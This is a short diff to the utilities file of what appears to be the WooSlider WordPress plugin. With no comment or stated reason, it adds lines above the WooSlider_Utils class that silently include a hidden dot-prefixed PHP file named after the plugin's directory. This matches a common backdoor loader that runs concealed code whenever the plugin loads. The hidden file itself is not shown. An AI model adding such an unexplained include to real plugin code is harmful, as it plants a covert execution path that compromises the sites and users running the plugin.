@@ -19,6 +19,10 @@ if ( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly
  * - get_supported_effects()
  * - get_slider_themes()
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class WooSlider_Utils {
 	/**
 	 * Get an array of the supported slider types.
